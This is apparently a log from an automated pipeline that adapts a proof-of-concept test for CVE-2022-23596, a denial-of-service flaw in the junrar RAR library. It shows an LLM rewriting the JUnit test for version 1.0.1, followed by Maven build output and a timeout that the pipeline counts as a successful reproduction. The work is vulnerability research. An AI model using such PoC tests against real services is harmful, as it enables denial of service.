[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
[ERROR]   symbol:   class Junrar
[ERROR]   location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version='1.0' encoding='utf-8'?>
<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <groupId>edu.vision.se</groupId><version>1.0-SNAPSHOT</version><modelVersion>4.0.0</modelVersion>
  <artifactId>CVE-2022-23596</artifactId>
  <name>junrar CVE-2022-23596</name>

  <properties>
    <maven.compiler.target>11</maven.compiler.target>
    <maven.compiler.source>11</maven.compiler.source>
  </properties>

  <dependencies>
    <dependency>
      <groupId>com.github.junrar</groupId>
      <artifactId>junrar</artifactId>
      <version>1.0.1</version>
    </dependency>
    <dependency>
        <groupId>cn.hutool</groupId>
        <artifactId>hutool-all</artifactId>
        <version>5.7.10</version>
    </dependency>
  <dependency><groupId>junit</groupId><artifactId>junit</artifactId><version>4.13.2</version></dependency>
  
  </dependencies>
</project>
---------
---------
[LLMClient] Response: test
---------
[96m[Adapter] LLM response for fix position: test[0m
[96m[Adapter] Fix position is in test code.[0m
---------
[LLMClient] Asking: You are given an error when executing exploit in in 1.0.1:com.github.junrar:junrar
This exploit file compiles and reproduced successfully in 2.0.0 with an assertion error.

Your task is fix the error.

Only output the modified version of the test file. No explanations. 
### Compilation Errors:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
  symbol:   class Junrar
  location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
  symbol:   variable Junrar
  location: class edu.vision.se.Testcase1
[INFO] 2 errors 
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.920 s
[INFO] Finished at: 2025-07-13T18:14:44Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.1:testCompile (default-testCompile) on project CVE-2022-23596: Compilation failure: Compilation failure: 
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[4,25] cannot find symbol
[ERROR]   symbol:   class Junrar
[ERROR]   location: package com.github.junrar
[ERROR] /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java:[19,13] cannot find symbol
[ERROR]   symbol:   variable Junrar
[ERROR]   location: class edu.vision.se.Testcase1
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

### Test File Content:
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Junrar;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try {
            Junrar.extract(file, destFile);
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}



---------
---------
[LLMClient] Response: Here's the modified version of the test file that should work with junrar 1.0.1:

```java
package edu.vision.se;

import cn.hutool.core.io.FileUtil;
import com.github.junrar.Archive;
import com.github.junrar.rarfile.FileHeader;
import org.junit.Test;
import com.github.junrar.exception.RarException;
import java.io.File;
import java.io.FileOutputStream;

import static org.junit.Assert.assertTrue;
import static org.junit.Assert.fail;

public class Testcase1 {
    @Test(timeout = 2000)
    public void testCorruptHeader() throws Exception {
        File file = FileUtil.file(System.getProperty("user.dir"), "src/test/resources/loop.rar");
        File destFile = File.createTempFile("temp", null).getParentFile();

        try (Archive archive = new Archive(file)) {
            FileHeader fileHeader = archive.nextFileHeader();
            while (fileHeader != null) {
                File out = new File(destFile, fileHeader.getFileNameString().trim());
                try (FileOutputStream os = new FileOutputStream(out)) {
                    archive.extractFile(fileHeader, os);
                }
                fileHeader = archive.nextFileHeader();
            }
            fail("the test fail");
        } catch (Exception e) {
            validateThrow(e);
        }
    }

    public void validateThrow(Throwable e) {
        assertTrue(e instanceof RarException);
    }
}
```
---------
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.027 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.017 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:351)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:176)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:990)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:410)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:351)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:537)
	at app//com.github.junrar.Archive.extractFile(Archive.java:479)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:25)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.440 s
[INFO] Finished at: 2025-07-13T18:15:12Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

Jul 13, 2025 6:15:10 PM com.github.junrar.rarfile.BaseBlock print
INFO: HeaderType: SubHeader
HeadCRC: 7777
Flags: 7757
HeaderSize: 30583
Position in file: 429
Jul 13, 2025 6:15:10 PM com.github.junrar.rarfile.BlockHeader print
INFO: DataSize: 2004318071 packSize: 2004318071
Jul 13, 2025 6:15:10 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: subtype: null
Jul 13, 2025 6:15:10 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: level: 119
Jul 13, 2025 6:15:10 PM com.github.junrar.Archive setFile
WARNING: exception in archive constructor maybe file is encrypted or currupt
java.lang.NullPointerException
	at com.github.junrar.Archive.readHeaders(Archive.java:397)
	at com.github.junrar.Archive.setFile(Archive.java:140)
	at com.github.junrar.Archive.setVolume(Archive.java:617)
	at com.github.junrar.Archive.<init>(Archive.java:112)
	at com.github.junrar.Archive.<init>(Archive.java:117)
	at edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:20)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base/java.lang.Thread.run(Thread.java:834)


[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[RepairModule] Test repair success with diff[0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2022-23596 on version 1.0.1...[0m
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------< edu.vision.se:CVE-2022-23596 >--------------------
[INFO] Building junrar CVE-2022-23596 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:2.5:clean (default-clean) @ CVE-2022-23596 ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:2.6:resources (default-resources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 0 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:compile (default-compile) @ CVE-2022-23596 ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:2.6:testResources (default-testResources) @ CVE-2022-23596 ---
[WARNING] Using platform encoding (UTF-8 actually) to copy filtered resources, i.e. build is platform dependent!
[INFO] Copying 1 resource
[INFO] 
[INFO] --- maven-compiler-plugin:3.1:testCompile (default-testCompile) @ CVE-2022-23596 ---
[INFO] Changes detected - recompiling the module!
[WARNING] File encoding has not been set, using platform encoding UTF-8, i.e. build is platform dependent!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/test-classes
[INFO] 
[INFO] --- maven-surefire-plugin:2.12.4:test (default-test) @ CVE-2022-23596 ---
[INFO] Surefire report directory: /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/surefire-reports

-------------------------------------------------------
 T E S T S
-------------------------------------------------------
Running edu.vision.se.Testcase1
Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 2.038 sec <<< FAILURE!
testCorruptHeader(edu.vision.se.Testcase1)  Time elapsed: 2.018 sec  <<< ERROR!
org.junit.runners.model.TestTimedOutException: test timed out after 2000 milliseconds
	at app//com.github.junrar.unpack.vm.RarVM.ExecuteCode(RarVM.java:351)
	at app//com.github.junrar.unpack.vm.RarVM.execute(RarVM.java:176)
	at app//com.github.junrar.unpack.Unpack.ExecuteCode(Unpack.java:990)
	at app//com.github.junrar.unpack.Unpack.UnpWriteBuf(Unpack.java:410)
	at app//com.github.junrar.unpack.Unpack.unpack29(Unpack.java:351)
	at app//com.github.junrar.unpack.Unpack.doUnpack(Unpack.java:116)
	at app//com.github.junrar.Archive.doExtractFile(Archive.java:537)
	at app//com.github.junrar.Archive.extractFile(Archive.java:479)
	at app//edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:25)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base@11/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base@11/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base@11/java.lang.reflect.Method.invoke(Method.java:566)
	at app//org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at app//org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at app//org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at app//org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at app//org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base@11/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base@11/java.lang.Thread.run(Thread.java:834)


Results :

Tests in error: 
  testCorruptHeader(edu.vision.se.Testcase1): test timed out after 2000 milliseconds

Tests run: 1, Failures: 0, Errors: 1, Skipped: 0

[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  3.292 s
[INFO] Finished at: 2025-07-13T18:15:16Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-surefire-plugin:2.12.4:test (default-test) on project CVE-2022-23596: There are test failures.
[ERROR] 
[ERROR] Please refer to /PoCAdaptation/exploit/result/CVE-2022-23596/1.0.1/exploit/target/surefire-reports for the individual test results.
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException

Jul 13, 2025 6:15:14 PM com.github.junrar.rarfile.BaseBlock print
INFO: HeaderType: SubHeader
HeadCRC: 7777
Flags: 7757
HeaderSize: 30583
Position in file: 429
Jul 13, 2025 6:15:14 PM com.github.junrar.rarfile.BlockHeader print
INFO: DataSize: 2004318071 packSize: 2004318071
Jul 13, 2025 6:15:14 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: subtype: null
Jul 13, 2025 6:15:14 PM com.github.junrar.rarfile.SubBlockHeader print
INFO: level: 119
Jul 13, 2025 6:15:14 PM com.github.junrar.Archive setFile
WARNING: exception in archive constructor maybe file is encrypted or currupt
java.lang.NullPointerException
	at com.github.junrar.Archive.readHeaders(Archive.java:397)
	at com.github.junrar.Archive.setFile(Archive.java:140)
	at com.github.junrar.Archive.setVolume(Archive.java:617)
	at com.github.junrar.Archive.<init>(Archive.java:112)
	at com.github.junrar.Archive.<init>(Archive.java:117)
	at edu.vision.se.Testcase1.testCorruptHeader(Testcase1.java:20)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59)
	at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12)
	at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56)
	at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:299)
	at org.junit.internal.runners.statements.FailOnTimeout$CallableStatement.call(FailOnTimeout.java:293)
	at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264)
	at java.base/java.lang.Thread.run(Thread.java:834)


[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'org.junit.runners.model.TestTimedOutException'[0m
[92m[Verifier] âœ“ Detail matched: 'test timed out after'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Adapter] Adaptation from 2.0.0 to 1.0.1 successful.[0m
[Adapt] âœ“ Completed: True
[96m[Adapter] Adaptation complete. Retesting exploit on 1.0.1...[0m
[92m[Executor] Adaptation + reproduction successful on 1.0.1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2022-23596/1.0.1[0m

[Executor] â–¶ Summary of return codes:
  - Version 5.0.0: âœ“ Success (exit code 0)
  - Version 1.0.1: âœ“ Success (exit code 0)
